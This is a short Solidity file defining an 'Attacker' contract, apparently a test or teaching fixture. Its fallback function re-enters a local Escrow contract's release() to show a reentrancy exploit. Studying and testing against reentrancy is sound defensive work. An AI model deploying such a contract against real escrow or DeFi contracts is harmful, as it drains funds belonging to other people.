// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Escrow.sol";

contract Attacker {
    Escrow public escrow;
    address public owner;
    uint256 public reentrantCallCount;

    constructor() {
        owner = msg.sender;
    }

    function setEscrow(address payable _escrowAddress) external {
        require(msg.sender == owner, "Only owner can set escrow");
        escrow = Escrow(_escrowAddress);
    }

    function attack() external {
        escrow.release();
    }

    // Fallback function to be called when ETH is sent to this contract
    receive() external payable {
        reentrantCallCount++;
        if (reentrantCallCount < 2) {
            // Attempt to re-enter the release function
            escrow.release();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
